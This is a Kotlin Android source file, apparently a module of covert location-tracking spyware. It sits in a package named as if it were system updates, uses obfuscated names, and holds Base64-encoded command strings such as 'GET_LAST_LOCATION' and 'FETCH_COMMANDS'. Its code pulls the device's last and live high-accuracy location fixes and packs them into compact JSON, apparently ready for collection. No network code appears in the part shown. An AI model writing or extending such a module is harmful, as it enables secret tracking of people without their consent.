package com.system.updates.modules

import android.content.Context
import android.location.Location
import android.location.LocationManager
import android.util.Base64
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationServices
import kotlinx.coroutines.*
import org.json.JSONObject

object LcGt {
    private const val a = "R0VUX0xBU1RfTE9DQVRJT04="
    private const val b = "RkVUQ0hfQ09NTUFORFM="
    private const val c = "RVJSX0ZFVENIX0ZBSUw="

    fun g(ctx: Context): String {
        val flc = LocationServices.getFusedLocationProviderClient(ctx)
        var r = ""
        runBlocking {
            val t = flc.lastLocation
            val loc = withTimeoutOrNull(5000) { t.await() }
            r = loc?.toJ() ?: l(ctx)?.toJ() ?: "{\"e\":\"${Base64.decode(c,Base64.DEFAULT).decodeToString()}\"}"
        }
        return r
    }

    private fun l(ctx: Context): Location? {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val ps = lm.getProviders(true)
        var bl: Location? = null
        for (p in ps) {
            val loc = lm.getLastKnownLocation(p) ?: continue
            if (bl == null || loc.accuracy < bl.accuracy) bl = loc
        }
        return bl
    }

    private fun Location.toJ(): String {
        val j = JSONObject()
        j.put("la", latitude)
        j.put("lo", longitude)
        j.put("ac", accuracy)
        j.put("ti", time)
        j.put("pr", provider)
        return j.toString()
    }

    suspend fun c(ctx: Context, sec: Int): List<String> {
        val flc = LocationServices.getFusedLocationProviderClient(ctx)
        val locs = mutableListOf<String>()
        val j = SupervisorJob()
        val sc = CoroutineScope(Dispatchers.IO + j)
        val cb = object : com.google.android.gms.location.LocationCallback() {
            override fun onLocationResult(r: com.google.android.gms.location.LocationResult) {
                r.lastLocation?.let { locs.add(it.toJ()) }
            }
        }
        val req = com.google.android.gms.location.LocationRequest.create().apply {
            interval = 5000
            fastestInterval = 2000
            priority = com.google.android.gms.location.LocationRequest.PRIORITY_HIGH_ACCURACY
        }
        flc.requestLocationUpdates(req, cb, null)
        delay(sec * 1000L)
        flc.removeLocationUpdates(cb)
        j.cancel()
        return locs
    }

    fun h(ctx: Context, inp: String): String {
        val b = inp.toByteArray()
        var x = 0
        for (i in b.indices) {
            x = x xor b[i].toInt()
        }
        return x.toString(16)
    }
}